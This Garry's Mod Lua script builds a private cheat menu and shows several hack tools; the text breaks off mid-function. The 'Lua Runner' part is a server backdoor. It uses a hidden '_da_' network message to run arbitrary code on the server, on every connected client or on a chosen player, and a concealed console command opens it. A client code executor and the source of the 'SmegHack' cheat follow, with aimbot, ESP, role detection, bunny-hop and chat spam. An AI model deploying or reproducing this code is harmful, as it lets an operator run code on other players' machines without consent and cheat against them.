local frame = vgui.Create( "DFrame" )
frame:SetSize( 500, 300 )
frame:Center()
frame:SetTitle ("MEGAVANYA315 [PRIVATE] [UID:-]")
frame:MakePopup()

local sheet = vgui.Create( "DColumnSheet", frame )
sheet:Dock( FILL )

local panel1 = vgui.Create( "DPanel", sheet )
panel1:Dock( FILL )
panel1.Paint = function( self, w, h ) draw.RoundedBox( 4, 0, 0, w, h, Color( 255, 128, 0 ) ) end 
sheet:AddSheet( "Lua", panel1, "icon16/application_osx_terminal.png" )

local panel2 = vgui.Create( "DPanel", sheet )
panel2:Dock( FILL )
panel2.Paint = function( self, w, h ) draw.RoundedBox( 4, 0, 0, w, h, Color( 255, 128, 0 ) ) end 
sheet:AddSheet( "Cheats", panel2, "icon16/tux.png" )

local panel3 = vgui.Create( "DPanel", sheet )
panel3:Dock( FILL )
panel3.Paint = function( self, w, h ) draw.RoundedBox( 4, 0, 0, w, h, Color( 255, 128, 0 ) ) end 
sheet:AddSheet( "Codes", panel3, "icon16/application_form_edit.png" )

local panel4 = vgui.Create( "DPanel", sheet )
panel4:Dock( FILL )
panel4.Paint = function( self, w, h ) draw.RoundedBox( 4, 0, 0, w, h, Color( 255, 128, 0 ) ) end 
sheet:AddSheet( "Songs", panel4, "icon16/music.png" )

local panel5 = vgui.Create( "DPanel", sheet )
panel5:Dock( FILL )
panel5.Paint = function( self, w, h ) draw.RoundedBox( 4, 0, 0, w, h, Color( 255, 128, 0 ) ) end 
sheet:AddSheet( "Skybox", panel5, "icon16/photo.png" )

local panel6 = vgui.Create( "DPanel", sheet )
panel6:Dock( FILL )
panel6.Paint = function( self, w, h ) draw.RoundedBox( 4, 0, 0, w, h, Color( 255, 128, 0 ) ) end 
sheet:AddSheet( "F.A.Q", panel6, "icon16/magnifier.png" )

local panel7 = vgui.Create( "DPanel", sheet )
panel7:Dock( FILL )
panel7.Paint = function( self, w, h ) draw.RoundedBox( 4, 0, 0, w, h, Color( 255, 128, 0 ) ) end 
sheet:AddSheet( "Games", panel7, "icon16/controller.png" )

local panel8 = vgui.Create( "DPanel", sheet )
panel8:Dock( FILL )
panel8.Paint = function( self, w, h ) draw.RoundedBox( 4, 0, 0, w, h, Color( 255, 128, 0 ) ) end 
sheet:AddSheet( "Key", panel8, "icon16/key.png" )

local panel9 = vgui.Create( "DPanel", sheet )
panel9:Dock( FILL )
panel9.Paint = function( self, w, h ) draw.RoundedBox( 4, 0, 0, w, h, Color( 255, 128, 0 ) ) end 
sheet:AddSheet( "Server", panel9, "icon16/folder.png" )

local panel10 = vgui.Create( "DPanel", sheet )
panel10:Dock( FILL )
panel10.Paint = function( self, w, h ) draw.RoundedBox( 4, 0, 0, w, h, Color( 255, 128, 0 ) ) end 
sheet:AddSheet( "Updates", panel10, "icon16/page_white_php.png" )

local panel11 = vgui.Create( "DPanel", sheet )
panel11:Dock( FILL )
panel11.Paint = function( self, w, h ) draw.RoundedBox( 4, 0, 0, w, h, Color( 255, 128, 0 ) ) end 
sheet:AddSheet( "Disco", panel11, "icon16/sport_8ball.png" )
----------------------------------------------------------------------------------------------------
local DermaButton = vgui.Create( "DButton", panel1 ) 
DermaButton:SetText( "Lua Loader" )
DermaButton:SetPos( 0, 0 )
DermaButton:SetSize( 400, 130 )
DermaButton.DoClick = function()
	local PANEL = {}

	PANEL.URL = "http://metastruct.github.io/lua_editor/"
	PANEL.COMPILE = "C"

	local javascript_escape_replacements =
	{
		["\\"] = "\\\\",
		["\0"] = "\\0" ,
		["\b"] = "\\b" ,
		["\t"] = "\\t" ,
		["\n"] = "\\n" ,
		["\v"] = "\\v" ,
		["\f"] = "\\f" ,
		["\r"] = "\\r" ,
		["\""] = "\\\"",
		["\'"] = "\\\'",
	}

	function PANEL:Init()
		self.Code = ""

		self.ErrorPanel = self:Add("DButton")
		self.ErrorPanel:SetFont('BudgetLabel')
		self.ErrorPanel:SetTextColor(Color(255,255,255))
		self.ErrorPanel:SetText("")
		self.ErrorPanel:SetTall(0)
		self.ErrorPanel.DoClick = function()
			self:GotoErrorLine()
		end
		self.ErrorPanel.DoRightClick = function(self)
			SetClipboardText(self:GetText())
		end
		self.ErrorPanel.Paint = function(self,w,h)
			surface.SetDrawColor(255,50,50)
			surface.DrawRect(0,0,w,h)
		end

		self:StartHTML()
	end

	function PANEL:Think()
		if self.NextValidate && self.NextValidate < CurTime() then
			self:ValidateCode()
		end
	end

	function PANEL:StartHTML()
		self.HTML = self:Add("DHTML")

		self:AddJavascriptCallback("OnCode")
		self:AddJavascriptCallback("OnLog")

		self.HTML:OpenURL(self.URL)
		
		self.HTML:RequestFocus()
	end

	function PANEL:ReloadHTML()
		self.HTML:OpenURL(self.URL)
	end

	function PANEL:JavascriptSafe(str)
		str = str:gsub(".",javascript_escape_replacements)
		str = str:gsub("\226\128\168","\\\226\128\168")
		str = str:gsub("\226\128\169","\\\226\128\169")
		return str
	end

	function PANEL:CallJS(JS)
		self.HTML:Call(JS)
	end

	function PANEL:AddJavascriptCallback(name)
		local func = self[name]

		self.HTML:AddFunction("gmodinterface",name,function(...)
			func(self,HTML,...)
		end)
	end

	function PANEL:OnCode(_,code)
		self.NextValidate = CurTime() + 0.2
		self.Code = code
	end

	function PANEL:OnLog(_,...)
		Msg("Editor: ")
		print(...)
	end

	function PANEL:SetCode(code)
		self.Code = code
		self:CallJS('SetContent("' .. self:JavascriptSafe(code) .. '");')
	end

	function PANEL:GetCode()
		return 'local me=Entity('..LocalPlayer():EntIndex()..') local trace=me:GetEyeTrace() local this,there=trace.Entity,trace.HitPos '..self.Code
	end

	function PANEL:SetGutterError(errline,errstr)
		self:CallJS("SetErr('" .. errline .. "','" .. self:JavascriptSafe(errstr) .. "')")
	end

	function PANEL:GotoLine(num)
		self:CallJS("GotoLine('" .. num .. "')")
	end

	function PANEL:ClearGutter()
		self:CallJS("ClearErr()")
	end

	function PANEL:GotoErrorLine()
		self:GotoLine(self.ErrorLine || 1)
	end

	function PANEL:SetError(err)
		if !IsValid(self.HTML) then
			self.ErrorPanel:SetText("")
			self:ClearGutter()
			return
		end

		local tall = 0

		if err then
			local line,err = string.match(err,self.COMPILE .. ":(%d*):(.+)")

			if line && err then
				tall = 20

				self.ErrorPanel:SetText((line && err) && ("Line " .. line .. ": " .. err) || err || "")
				self.ErrorLine = tonumber(string.match(err," at line (%d)%)") || line) || 1
				self:SetGutterError(self.ErrorLine,err)
			end
		else
			self.ErrorPanel:SetText("")
			self:ClearGutter()
		end

		local wide = self:GetWide()
		local tallm = self:GetTall()

		self.ErrorPanel:SetPos(0,tallm - tall)
		self.ErrorPanel:SetSize(wide,tall)
		self.HTML:SetSize(wide,tallm - tall)
	end

	function PANEL:ValidateCode() 
		local time = SysTime()
		local code = self:GetCode()

		self.NextValidate = nil

		if !code || code == "" then
			self:SetError()
			return
		end

		local errormsg = CompileString(code,self.COMPILE,false)
		time = SysTime() - time

		if type(errormsg) == "string" then
			self:SetError(errormsg)
		elseif time > 0.25 then
			self:SetError("Compiling took too long. (" .. math.Round(time * 1000) .. ")")
		else
			self:SetError()
		end
	end

	function PANEL:PerformLayout(w,h)
		local tall = self.ErrorPanel:GetTall()

		self.ErrorPanel:SetPos(0,h - tall)
		self.ErrorPanel:SetSize(w,tall)

		self.HTML:SetSize(w,h - tall)
	end


	vgui.Register("lua_editor",PANEL,"EditablePanel")

	local menu = vgui.Create('DFrame')
	menu:SetSize(ScrW()/2,ScrH()/2)
	menu:SetTitle('Lua Loader')
	menu:Center()
	menu:SetSizable(true)
	menu:MakePopup()
	menu:ShowCloseButton(false)
	menu.Paint = function(self,w,h)
		surface.SetDrawColor(100,30,30)
		surface.DrawRect(0, 0, w, 25)
		
		surface.SetDrawColor(0,0,0)
		surface.DrawRect(0, 25, w, h)
	end
	
	local clos = vgui.Create("DButton", menu)
	clos:SetSize(40,23)
	clos:SetText("")
	clos.Paint = function(self,w,h)
		surface.SetDrawColor(196,80,80)
		surface.DrawRect(0,0,w,h)
		surface.SetFont("marlett")
		local s,s1 = surface.GetTextSize("r")
		surface.SetTextPos(w/2-s/2,h/2-s1/2)
		surface.SetTextColor(255,255,255)
		surface.DrawText("r")
	end
	clos.DoClick = function()
		menu:SetVisible(!menu:IsVisible())
	end

	local ed = vgui.Create('lua_editor', menu)
	ed:SetPos(5, 55)

	menu.PerformLayout = function(self, w, h)
		clos:SetPos(w-41, 1)
		ed:SetSize(w-10, h-60)
	end

	local offset = 5

	local function CreateBtn(wide, text, icon, fn)
		local mt = Material(icon)
		local btn = vgui.Create('DButton', menu)
		btn:SetText('')
		btn.Paint = function(self,w,h)
			if self.Hovered then
				if self.Depressed then
					surface.SetDrawColor(90,90,90)
				else
					surface.SetDrawColor(70,70,70)
				end
			else
				surface.SetDrawColor(40,40,40)
			end
		
			surface.DrawRect(0,0,w,h)
			surface.SetDrawColor(255,255,255)
			surface.SetMaterial(mt)
			surface.DrawTexturedRect(5,h / 2 - 8,16,16)
			draw.SimpleText(text,'BudgetLabel',26,h / 2,Color(255,255,255),0,1)
		end
		btn.DoClick = fn
		btn:SetSize(wide, 20)
		btn:SetPos(offset, 30)
		offset=offset + wide + 5
	end


	CreateBtn(115, "RunStrEx", 'icon16/arrow_down.png', function()
		local code = ed:GetCode()
		RunStringEx(code)
	end)


	concommand.Add("luaeditor", function() menu:SetVisible(!menu:IsVisible()) end)
	

	
	MsgC(Color(255, 155, 55), "Loading end!\n")
end



local DermaButton = vgui.Create( "DButton", panel1 ) 
DermaButton:SetText( "Lua Runner" )
DermaButton:SetPos( 0, 130 )
DermaButton:SetSize( 400, 140)
DermaButton.DoClick = function()
	-- Drop it on autorun/server
-- You need to be superadmin
--------------------------------
-- Положи это в autorun/server
-- Тебе нужно быть супер админом
------------------------------------------------------------------------------------------------
-- Console Command: editor  / Консольная команда: editor
------------------------------------------------------------------------------------------------

util.AddNetworkString('_da_')

local function RunOnCL(tar, code)
	if !tar.CodeReceiver then
		tar.CodeReceiver=true
		tar:SendLua([[net.Receive('_da_',function() RunString(net.ReadString()) end)]])
	end
	net.Start('_da_')
	net.WriteString(code)
	net.Send(tar)
end

local rec = {
	[1] = function(code)
		RunString(code)
	end,
	[2] = function(code)
		for k, v in pairs(player.GetAll()) do
			RunOnCL(v, code)
		end
	end,
	[3] = function(code)
		RunOnCL(net.ReadEntity(), code)
	end,
}

net.Receive('_da_', function(len, ply)
    if ( !ply:IsRoot() ) then return end
	
	local code = net.ReadString()
	rec[net.ReadUInt(2)](code)
end)

local code = [[
local PANEL = {}

PANEL.URL = "http://metastruct.github.io/lua_editor/"
PANEL.COMPILE = "C"

local javascript_escape_replacements =
{
	["\\"] = "\\\\",
	["\0"] = "\\0" ,
	["\b"] = "\\b" ,
	["\t"] = "\\t" ,
	["\n"] = "\\n" ,
	["\v"] = "\\v" ,
	["\f"] = "\\f" ,
	["\r"] = "\\r" ,
	["\""] = "\\\"",
	["\'"] = "\\\'",
}

function PANEL:Init()
	self.Code = ""

	self.ErrorPanel = self:Add("DButton")
	self.ErrorPanel:SetFont('BudgetLabel')
	self.ErrorPanel:SetTextColor(Color(255,255,255))
	self.ErrorPanel:SetText("")
	self.ErrorPanel:SetTall(0)
	self.ErrorPanel.DoClick = function()
		self:GotoErrorLine()
	end
	self.ErrorPanel.DoRightClick = function(self)
		SetClipboardText(self:GetText())
	end
	self.ErrorPanel.Paint = function(self,w,h)
		surface.SetDrawColor(255,50,50)
		surface.DrawRect(0,0,w,h)
	end

	self:StartHTML()
end

function PANEL:Think()
	if self.NextValidate && self.NextValidate < CurTime() then
		self:ValidateCode()
	end
end

function PANEL:StartHTML()
	self.HTML = self:Add("DHTML")

	self:AddJavascriptCallback("OnCode")
	self:AddJavascriptCallback("OnLog")

	self.HTML:OpenURL(self.URL)
	
	self.HTML:RequestFocus()
end

function PANEL:ReloadHTML()
	self.HTML:OpenURL(self.URL)
end

function PANEL:JavascriptSafe(str)
	str = str:gsub(".",javascript_escape_replacements)
	str = str:gsub("\226\128\168","\\\226\128\168")
	str = str:gsub("\226\128\169","\\\226\128\169")
	return str
end

function PANEL:CallJS(JS)
	self.HTML:Call(JS)
end

function PANEL:AddJavascriptCallback(name)
	local func = self[name]

	self.HTML:AddFunction("gmodinterface",name,function(...)
		func(self,HTML,...)
	end)
end

function PANEL:OnCode(_,code)
	self.NextValidate = CurTime() + 0.2
	self.Code = code
end

function PANEL:OnLog(_,...)
	Msg("Editor: ")
	print(...)
end

function PANEL:SetCode(code)
	self.Code = code
	self:CallJS('SetContent("' .. self:JavascriptSafe(code) .. '");')
end

function PANEL:GetCode()
	return 'local me=Entity('..LocalPlayer():EntIndex()..') local trace=me:GetEyeTrace() local this,there=trace.Entity,trace.HitPos '..self.Code
end

function PANEL:SetGutterError(errline,errstr)
	self:CallJS("SetErr('" .. errline .. "','" .. self:JavascriptSafe(errstr) .. "')")
end

function PANEL:GotoLine(num)
	self:CallJS("GotoLine('" .. num .. "')")
end

function PANEL:ClearGutter()
	self:CallJS("ClearErr()")
end

function PANEL:GotoErrorLine()
	self:GotoLine(self.ErrorLine || 1)
end

function PANEL:SetError(err)
	if !IsValid(self.HTML) then
		self.ErrorPanel:SetText("")
		self:ClearGutter()
		return
	end

	local tall = 0

	if err then
		local line,err = string.match(err,self.COMPILE .. ":(%d*):(.+)")

		if line && err then
			tall = 20

			self.ErrorPanel:SetText((line && err) && ("Line " .. line .. ": " .. err) || err || "")
			self.ErrorLine = tonumber(string.match(err," at line (%d)%)") || line) || 1
			self:SetGutterError(self.ErrorLine,err)
		end
	else
		self.ErrorPanel:SetText("")
		self:ClearGutter()
	end

	local wide = self:GetWide()
	local tallm = self:GetTall()

	self.ErrorPanel:SetPos(0,tallm - tall)
	self.ErrorPanel:SetSize(wide,tall)
	self.HTML:SetSize(wide,tallm - tall)
end

function PANEL:ValidateCode() 
	local time = SysTime()
	local code = self:GetCode()

	self.NextValidate = nil

	if !code || code == "" then
		self:SetError()
		return
	end

	local errormsg = CompileString(code,self.COMPILE,false)
	time = SysTime() - time

	if type(errormsg) == "string" then
		self:SetError(errormsg)
	elseif time > 0.25 then
		self:SetError("Compiling took too long. (" .. math.Round(time * 1000) .. ")")
	else
		self:SetError()
	end
end

function PANEL:PerformLayout(w,h)
	local tall = self.ErrorPanel:GetTall()

	self.ErrorPanel:SetPos(0,h - tall)
	self.ErrorPanel:SetSize(w,tall)

	self.HTML:SetSize(w,h - tall)
end


vgui.Register("lua_editor",PANEL,"EditablePanel")

local menu = vgui.Create('DFrame')
menu:SetSize(ScrW()/2,ScrH()/2)
menu:SetTitle('')
menu:Center()
menu:SetSizable(true)
menu:MakePopup()
menu:ShowCloseButton(false)
menu.Paint = function(self,w,h)
	surface.SetDrawColor(30,30,30)
	surface.DrawRect(0, 0, w, 25)
	
	surface.SetDrawColor(0,0,0)
	surface.DrawRect(0, 25, w, h-25)
end

local clos = vgui.Create("DButton", menu)
clos:SetSize(40,23)
clos:SetText("")
clos.Paint = function(self,w,h)
	surface.SetDrawColor(196,80,80)
	surface.DrawRect(0,0,w,h)
	surface.SetFont("marlett")
	local s,s1 = surface.GetTextSize("r")
	surface.SetTextPos(w/2-s/2,h/2-s1/2)
	surface.SetTextColor(255,255,255)
	surface.DrawText("r")
end
clos.DoClick = function()
	menu:SetVisible(!menu:IsVisible())
end

local ed = vgui.Create('lua_editor', menu)
ed:SetPos(5, 55)

menu.PerformLayout = function(self, w, h)
	clos:SetPos(w-41, 1)
	ed:SetSize(w-10, h-60)
end

local offset = 5

local function CreateBtn(wide, text, icon, fn)
	local mt = Material(icon)
	local btn = vgui.Create('DButton', menu)
	btn:SetText('')
	btn.Paint = function(self,w,h)
		if self.Hovered then
			if self.Depressed then
				surface.SetDrawColor(90,90,90)
			else
				surface.SetDrawColor(70,70,70)
			end
		else
			surface.SetDrawColor(40,40,40)
		end
	
		surface.DrawRect(0,0,w,h)
		surface.SetDrawColor(255,255,255)
		surface.SetMaterial(mt)
		surface.DrawTexturedRect(5,h / 2 - 8,16,16)
		draw.SimpleText(text,'BudgetLabel',26,h / 2,Color(255,255,255),0,1)
	end
	btn.DoClick = fn
	btn:SetSize(wide, 20)
	btn:SetPos(offset, 30)
	offset=offset + wide + 5
end


	CreateBtn(130, "Run on server", 'icon16/application_osx_terminal.png', function()
		local code = ed:GetCode()
		net.Start('_da_')
		net.WriteString(code)
		net.WriteUInt(1, 2)
		net.SendToServer()
	end)
	CreateBtn(124, "Run on urself", 'icon16/arrow_down.png', function()
		local code = ed:GetCode()
		RunString(code)
	end)
	CreateBtn(130, "Run on client", 'icon16/group.png', function()
		local code = ed:GetCode()
		net.Start('_da_')
		net.WriteString(code)
		net.WriteUInt(2, 2)
		net.SendToServer()
	end)
	CreateBtn(125, "Run on player", 'icon16/user.png', function() 
		local code = ed:GetCode()
		local m = DermaMenu()
		for k, v in pairs(player.GetAll()) do
			m:AddOption(v:Name(), function()
				net.Start('_da_')
				net.WriteString(code)
				net.WriteUInt(3, 2)
				net.WriteEntity(v)
				net.SendToServer()
			end)
		end
		m:Open()
	end)

	CreateBtn(115, "Get player", 'icon16/pencil.png', function() 
		local m = DermaMenu()
		for k, v in pairs(player.GetAll()) do
			m:AddOption(v:Name(), function()
				SetClipboardText('Entity('..v:EntIndex()..')')
			end)
		end
		m:Open()
	end)
concommand.Add('luarunner', function() menu:SetVisible(!menu:IsVisible()) end)
]]

concommand.Add('luarunner', function(ply)
    if ( !ply:IsRoot() ) then ply:SendLua([[MsgC( Color( 255, 0, 0 ), "idk how you knew about this command, but it's not for you." )]]) return end
	RunOnCL(ply, code)
end)
end
-------------------------------------------------------------------------------------------------------------
local DermaButton = vgui.Create( "DButton", panel2 )
DermaButton:SetText( "SmegHack" )
DermaButton:SetPos( 0, 0 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()
	--[[
          _____                    _____                    _____                    _____                            _____                    _____                    _____                    _____          
         /\    \                  /\    \                  /\    \                  /\    \                          /\    \                  /\    \                  /\    \                  /\    \         
        /::\    \                /::\____\                /::\    \                /::\    \                        /::\____\                /::\    \                /::\    \                /::\____\        
       /::::\    \              /::::|   |               /::::\    \              /::::\    \                      /:::/    /               /::::\    \              /::::\    \              /:::/    /        
      /::::::\    \            /:::::|   |              /::::::\    \            /::::::\    \                    /:::/    /               /::::::\    \            /::::::\    \            /:::/    /         
     /:::/\:::\    \          /::::::|   |             /:::/\:::\    \          /:::/\:::\    \                  /:::/    /               /:::/\:::\    \          /:::/\:::\    \          /:::/    /          
    /:::/__\:::\    \        /:::/|::|   |            /:::/__\:::\    \        /:::/  \:::\    \                /:::/____/               /:::/__\:::\    \        /:::/  \:::\    \        /:::/____/           
    \:::\   \:::\    \      /:::/ |::|   |           /::::\   \:::\    \      /:::/    \:::\    \              /::::\    \              /::::\   \:::\    \      /:::/    \:::\    \      /::::\    \           
  ___\:::\   \:::\    \    /:::/  |::|___|______    /::::::\   \:::\    \    /:::/    / \:::\    \            /::::::\    \   _____    /::::::\   \:::\    \    /:::/    / \:::\    \    /::::::\____\________  
 /\   \:::\   \:::\    \  /:::/   |::::::::\    \  /:::/\:::\   \:::\    \  /:::/    /   \:::\ ___\          /:::/\:::\    \ /\    \  /:::/\:::\   \:::\    \  /:::/    /   \:::\    \  /:::/\:::::::::::\    \ 
/::\   \:::\   \:::\____\/:::/    |:::::::::\____\/:::/__\:::\   \:::\____\/:::/____/  ___\:::|    |        /:::/  \:::\    /::\____\/:::/  \:::\   \:::\____\/:::/____/     \:::\____\/:::/  |:::::::::::\____\
\:::\   \:::\   \::/    /\::/    / ~~~~~/:::/    /\:::\   \:::\   \::/    /\:::\    \ /\  /:::|____|        \::/    \:::\  /:::/    /\::/    \:::\  /:::/    /\:::\    \      \::/    /\::/   |::|~~~|~~~~~     
 \:::\   \:::\   \/____/  \/____/      /:::/    /  \:::\   \:::\   \/____/  \:::\    /::\ \::/    /          \/____/ \:::\/:::/    /  \/____/ \:::\/:::/    /  \:::\    \      \/____/  \/____|::|   |          
  \:::\   \:::\    \                  /:::/    /    \:::\   \:::\    \       \:::\   \:::\ \/____/                    \::::::/    /            \::::::/    /    \:::\    \                    |::|   |          
   \:::\   \:::\____\                /:::/    /      \:::\   \:::\____\       \:::\   \:::\____\                       \::::/    /              \::::/    /      \:::\    \                   |::|   |          
    \:::\  /:::/    /               /:::/    /        \:::\   \::/    /        \:::\  /:::/    /                       /:::/    /               /:::/    /        \:::\    \                  |::|   |          
     \:::\/:::/    /               /:::/    /          \:::\   \/____/          \:::\/:::/    /                       /:::/    /               /:::/    /          \:::\    \                 |::|   |          
      \::::::/    /               /:::/    /            \:::\    \               \::::::/    /                       /:::/    /               /:::/    /            \:::\    \                |::|   |          
       \::::/    /               /:::/    /              \:::\____\               \::::/    /                       /:::/    /               /:::/    /              \:::\____\               \::|   |          
        \::/    /                \::/    /                \::/    /                \::/____/                        \::/    /                \::/    /                \::/    /                \:|   |          
         \/____/                  \/____/                  \/____/                                                   \/____/                  \/____/                  \/____/                  \|___|          
        Made by mmmaaalll1.                                                                                                                                                                                                              
--]]

/*
	I don’t claim this to be the best hack in the world, in fact this is my first gLua hack (and my first real cheat). I would consider this cheat to be feature full, however being a relatively new gLua coder I accept that all my coding
	is probably shit, feed back is welcome. As I have progressed with this cheat I have realized that I could have done things differently with much more efficient code etc. but I haven’t been bothered to fix it.

	Fyi, due to a update to Garry's Mod the incrementvar exploit (speed hack) no longer works.
*/


//Variables
local SmegHack = {}
SmegHack.FriendsList = {}
SmegHack.TextEntries = {}
SmegHack.Hooks = {}
SmegHack.EntityESP = {}
SmegHack.BoneOrder = {}
SmegHack.Traitors = {}
SmegHack.Murderers = {}

SmegHack.Options = {}

SmegHack.Options["Aimbot_Toggle"] = false
SmegHack.Options["Aimbot_LOSCheck"] = false
SmegHack.Options["Aimbot_AutoWall"] = true
SmegHack.Options["Aimbot_AimOnKey"] = false
SmegHack.Options["Aimbot_AimOnKey_Key"] = 0
SmegHack.Options["Aimbot_SmoothAim"] = false
SmegHack.Options["Aimbot_SmoothAim_Value"] = 600
SmegHack.Options["Aimbot_AimPriority"] = "Distance"
SmegHack.Options["Aimbot_FOV"] = false
if LocalPlayer():GetFOV() != nil then SmegHack.Options["Aimbot_FOV_Value"] = LocalPlayer():GetFOV() else SmegHack.Options["Aimbot_FOV_Value"] = 75 end
SmegHack.Options["Aimbot_StickToTarget"] = false
SmegHack.Options["Aimbot_BoneAim"] = false
SmegHack.Options["Aimbot_AutoShoot"] = false

SmegHack.Options["Aimbot_AimTeam"] = false
SmegHack.Options["Aimbot_AimOpponents"] = true
SmegHack.Options["Aimbot_AimFriends"] = false
SmegHack.Options["Aimbot_AimEnemies"] = false
SmegHack.Options["Aimbot_AimNPCs"] = false
SmegHack.Options["Aimbot_AimSpectators"] = false
SmegHack.Options["Aimbot_AimTeamV"] = "Aim"
SmegHack.Options["Aimbot_AimOpponentsV"] = "Aim"
SmegHack.Options["Aimbot_AimFriendsV"] = "Aim"
SmegHack.Options["Aimbot_AimEnemiesV"] = "Aim"
SmegHack.Options["Aimbot_AimNPCsV"] = "Aim"
SmegHack.Options["Aimbot_AimSpectatorsV"] = "Aim"

SmegHack.Options["Aimbot_OffsetX"] = 0
SmegHack.Options["Aimbot_OffsetY"] = 0

SmegHack.Options["ESP_Toggle"] = false
SmegHack.Options["ESP_ShowTeam"] = true
SmegHack.Options["ESP_ShowOpponents"] = true
SmegHack.Options["ESP_ShowFriends"] = false
SmegHack.Options["ESP_ShowEnemies"] = false
SmegHack.Options["ESP_ShowNPCs"] = false
SmegHack.Options["ESP_ShowSpectators"] = false

SmegHack.Options["ESP_ShowTeamV"] = "Show"
SmegHack.Options["ESP_ShowOpponentsV"] = "Show"
SmegHack.Options["ESP_ShowFriendsV"] = "Show"
SmegHack.Options["ESP_ShowEnemiesV"] = "Show"
SmegHack.Options["ESP_ShowNPCsV"] = "Show"
SmegHack.Options["ESP_ShowSpectatorsV"] = "Show"

SmegHack.Options["ESP_Entity_Toggle"] = false
SmegHack.Options["ESP_Entities_NameTags"] = false
SmegHack.Options["ESP_Entities_BoundaryBoxes"] = false
SmegHack.Options["ESP_Entities_BoundaryBoxes_Mode"] = "2D"

SmegHack.Options["ESP_BoundaryBoxes"] = false
SmegHack.Options["ESP_BoundaryBoxes_Mode"] = "2D"
SmegHack.Options["ESP_NameTags"] = false
SmegHack.Options["ESP_Weapon"] = false
SmegHack.Options["ESP_Distance"] = false
SmegHack.Options["ESP_Health"] = false
SmegHack.Options["ESP_Skeleton"] = false
SmegHack.Options["ESP_Crosshair"] = false
SmegHack.Options["ESP_Crosshair_Size"] = 50
SmegHack.Options["ESP_Crosshair_Mode"] = "Team"
SmegHack.Options["ESP_Crosshair_Color_R"] = 0
SmegHack.Options["ESP_Crosshair_Color_G"] = 0
SmegHack.Options["ESP_Crosshair_Color_B"] = 255
SmegHack.Options["ESP_Crosshair_Color_A"] = 255

SmegHack.Options["Misc_Clock"] = false
SmegHack.Options["Misc_Clock_Mode"] = "Fast"
if GetConVarNumber("host_timescale") != nil then SmegHack.Options["Misc_Clock_Speed"] = GetConVarNumber("host_timescale") else SmegHack.Options["Misc_Clock_Speed"] = 1 end
SmegHack.Options["Misc_AdminBox"] = false
SmegHack.Options["Misc_AdminBox_Mode"] = "Auto"
SmegHack.Options["Misc_AdminBox_PosX"] = 0
SmegHack.Options["Misc_AdminBox_PosY"] = 0
SmegHack.Options["Misc_SpectatorsBox"] = false
SmegHack.Options["Misc_SpectatorsBox_Mode"] = "Auto"
SmegHack.Options["Misc_SpectatorsBox_PosX"] = 150
SmegHack.Options["Misc_SpectatorsBox_PosY"] = 0
SmegHack.Options["Misc_AutoButton"] = false

SmegHack.Options["Friends_FriendIsEnemy"] = false
SmegHack.Options["Friends_SteamFriends"] = false
SmegHack.Options["Friends_SteamEnemies"] = false

SmegHack.Options["Cams_Toggle"] = false
SmegHack.Options["Cams_CSNoclip"] = false
SmegHack.Options["Cams_CSNoclip_Speed"] = 10
SmegHack.Options["Cams_ThirdPerson"] = false
SmegHack.Options["Cams_ThirdPerson_Zoom"] = 30

SmegHack.Options["Bhop_Toggle"] = false
SmegHack.Options["Bhop_FastWalk"] = false
SmegHack.Options["Bhop_AutoHop"] = false
SmegHack.Options["Bhop_AutoStrafe"] = false
SmegHack.Options["Bhop_EdgeJump"] = false
SmegHack.Options["Bhop_EdgeJump_Distance"] = 40
SmegHack.Options["Bhop_Sideways"] = false
SmegHack.Options["Bhop_WOnly"] = false

SmegHack.Options["Spam_Toggle"] = false
SmegHack.Options["Spam_Delay"] = false
SmegHack.Options["Spam_Delay_Value"] = 10
SmegHack.Options["Spam_AntiAntiSpam"] = false
SmegHack.Options["Spam_Message_1"] = false
SmegHack.Options["Spam_Message_2"] = false
SmegHack.Options["Spam_Message_3"] = false
SmegHack.Options["Spam_Message_4"] = false
SmegHack.Options["Spam_Message_5"] = false


local function RandomString() return tostring(math.random(-9999999999, 9999999999)) end
local function RandomShortString() return tostring(math.random(0, 100)) end
local MenuOpen = false
local UpdateBoneThink = false
local UpdateBoneThinkNum = 0
local NormSvCheats, NormHostTimeScale, TimeScaleChange = 0, 1, false
local FPSValue = 0
local DisplayBoxWidths = 0
local AdminsListBool = false
local SpecsListBool = false
local AdminBoxTall, AdminBoxWide, SpecBoxTall, SpecBoxWide = 0, 0, 0, 0
local GMode
local MDone = false
if string.find(string.lower(GAMEMODE.Name), "terror") != nil then
	GMode = 1
elseif string.find(string.lower(GAMEMODE.Name), "murder") != nil then
	GMode = 2
else
	GMode = 3
end

//Fonts
surface.CreateFont("Menu_Title",{font = "coolvetica", size = 25})
surface.CreateFont("ESP_Font_Main",{font = "coolvetica", size = 20})
surface.CreateFont("ESP_Font_Entity",{font = "coolvetica", size = 17})
surface.CreateFont("ESP_Font_Health",{font = "coolvetica", size = 12})
surface.CreateFont("Cams",{font = "Arial", size = 25})

//Hack Management
function AddHook( NormID, Event, ID, Function )
	table.insert( SmegHack.Hooks, NormID.."|"..Event.."|"..ID )
	hook.Add( Event, ID, Function )
end

function RemoveHook( NormID )
	for k, v in pairs( SmegHack.Hooks ) do
		local SubTable = string.Explode( "|", v )
		if SubTable[1] == NormID then
			hook.Remove( SubTable[2], SubTable[3] )
			table.remove( SmegHack.Hooks, k )
		end
	end
end

function GetTeam( Ply )
	local Team = Ply:Team()
	local t, c
	if GMode == 1 then
		if Team == TEAM_SPECTATOR then
			t = Team
			c = team.GetColor(Team)
		else
			if table.HasValue(SmegHack.Traitors, Ply:SteamID()) then
				t = 1
				c = Color(255,0,0)
			elseif Ply:GetRole() == 2 then
				t = 0
				c = Color(0,0,255)
			else
				t = 0
				c = Color(0,255,0)
			end
		end
	elseif GMode == 2 then
		if Team == TEAM_SPECTATOR then
			t = Team
			c = team.GetColor(Team)
		else
			if table.HasValue(SmegHack.Murderers, Ply:SteamID()) then
				t = 2
				c = Color(255,0,0)
			else
				t = 1
				local Moo = false
				for k, v in pairs(Ply:GetWeapons()) do
					if v:GetClass() == "weapon_mu_magnum" then
						Moo = true
						break
					end
				end
				if Moo == true then
					c = Color(0,0,255)
				else
					c = Color(0,255,0)
				end
			end
		end
	else
		t = Team
		c = team.GetColor(Team)
	end
	return t, c
end

function UnloadSmegHack( Display )
	//Menu
	concommand.Remove("SmegHack_Menu")

	//Hooks
	SmegHack.Options["Misc_AdminBox"] = false
	SmegHack.Options["Misc_SpectatorsBox"] = false //These remove the admin/spectator boxes

	timer.Simple( 0.5, function() 
		for k, v in pairs( SmegHack.Hooks ) do
			local SubTable = string.Explode( "|", v )
			hook.Remove( SubTable[2], SubTable[3] )
		end
		table.Empty( SmegHack.Hooks )

		//Clock Speed Manipulator
